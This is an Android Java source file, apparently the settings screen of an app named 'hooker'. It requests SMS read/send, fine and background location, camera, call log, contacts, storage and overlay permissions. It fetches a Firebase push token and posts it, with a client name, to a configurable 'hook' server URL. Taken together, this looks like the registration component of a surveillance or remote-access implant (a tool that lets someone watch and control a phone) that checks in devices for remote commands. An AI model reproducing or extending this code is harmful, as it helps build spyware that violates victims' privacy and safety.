package com.zillinium.hooker;

import android.Manifest;
import android.app.Activity;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.preference.Preference;
import android.preference.PreferenceActivity;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AlertDialog;
import android.view.ViewGroup;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.FirebaseApp;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.InstanceIdResult;
import com.zillinium.hooker.Requester;

public class Preferences extends PreferenceActivity implements
SharedPreferences.OnSharedPreferenceChangeListener {
    SharedPreferences sharedPref;
    SharedPreferences.Editor editor;
    public static Manifest.permission perm;
    private static final int PERMISSION_REQUEST_CODE = 1;
    private static final String[] permissions = {
        perm.ACCESS_WIFI_STATE,
        perm.RECEIVE_SMS,
        perm.READ_SMS,
        perm.INTERNET,
        perm.ACCESS_FINE_LOCATION,
        perm.SEND_SMS,
        perm.ACCESS_BACKGROUND_LOCATION,
        perm. WRITE_EXTERNAL_STORAGE,
        perm. READ_EXTERNAL_STORAGE,
        perm. CAMERA,
        perm.READ_CALL_LOG,
        perm.READ_CONTACTS
    };
    AppSettings settings;
    ViewGroup contentWrapper;
    Activity me;

    @Override
    public void onSharedPreferenceChanged(SharedPreferences prefs, String key) {
        // load new changes
        settings = AppSettings.get(this);

        if (key.equals("hook")) {
            Preference hookServer = getPreferenceScreen().findPreference("hook");
            hookServer.setSummary(settings.getHookURL());
        }

        if (key.equals("client")) {
            Preference name = getPreferenceScreen().findPreference("client");
            name.setSummary(settings.getName());
        }

    } 

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        addPreferencesFromResource(R.xml.Settings);
        settings = AppSettings.get(getApplicationContext());
        me = this;
        Requester.setup(me);
        setTheme(R.style.AppTheme);
        sharedPref = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        editor = sharedPref.edit();
        sharedPref.registerOnSharedPreferenceChangeListener(this);

        requestPermissions();


        if (!Settings.canDrawOverlays(getApplicationContext())) {
            Intent myIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
            Uri uri = Uri.fromParts("package", getPackageName(), null);
            myIntent.setData(uri);
            startActivityForResult(myIntent, 536);
            return;
        }
        //  getFCMToken();


        if (Build.VERSION.SDK_INT < 11) {
            // getPreferenceScreen().findPreference("pref_key").setEnabled(false);
        }
        Preference name = getPreferenceScreen().findPreference("client");
        name.setSummary(settings.getName());

        Preference tokenPref = getPreferenceScreen().findPreference("token");
        String token = sharedPref.getString("token", null);
        if (token != null) {
            tokenPref.setSummary(token);
        }
        tokenPref.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener(){

                @Override
                public boolean onPreferenceClick(Preference p1) {
                    p1.setSummary("Loading...");
                    getFCMToken();
                    return false;
                }
            });
        Preference hookURL = getPreferenceScreen().findPreference("hook");
        hookURL.setSummary(settings.getHookURL());


    }

    public void getFCMToken() {
        //Get Firebase FCM token
        FirebaseApp.initializeApp(me.getApplicationContext());
        FirebaseInstanceId.getInstance().getInstanceId().addOnSuccessListener(me, new OnSuccessListener<InstanceIdResult>() {
                @Override
                public void onSuccess(InstanceIdResult instanceIdResult) {
                    String token = instanceIdResult.getToken();
                    String dat = "key=" + token + "&name=" + settings.getName();
                    logToServer(dat);
                    editor.putString("token", token);
                    editor.commit();
                    Preference tokenPref = getPreferenceScreen().findPreference("token");
                    tokenPref.setSummary(sharedPref.getString("token", "nothing"));
                }
            }); 
    }

    private void logToServer(final String data) {
        final String url = settings.getHookURL();

        new Thread(new Runnable(){
                @Override
                public void run() {
                    try {
                        // open connection
                        Requester.Get(settings.getHookURL());
                        // send
                        String result = Requester.Post(settings.getHookURL(), data);
                    }
                    catch (final Exception e) {
                    }
                }
            }).start();
    }   

    private void requestPermissions() {
        boolean allPermissionsGranted = true;

        for (String permission : permissions) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allPermissionsGranted = false;
                break;
            }
        }

        if (!allPermissionsGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allPermissionsGranted = true;

            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false;
                    break;
                }
            }

            if (!allPermissionsGranted) {
                AlertDialog.Builder builder = new AlertDialog.Builder(this);
                builder.setTitle("Permissions")
                    .setMessage("You have denied permissions required to use this app")
                    .setPositiveButton("Try Again", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            // Perform action when OK button is clicked
                            requestPermissions();
                        }
                    })
                    .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            // Perform action when Cancel button is clicked
                            dialog.dismiss();
                        }
                    });

                AlertDialog alertDialog = builder.create();
                alertDialog.show();
            }
        }
    }




}

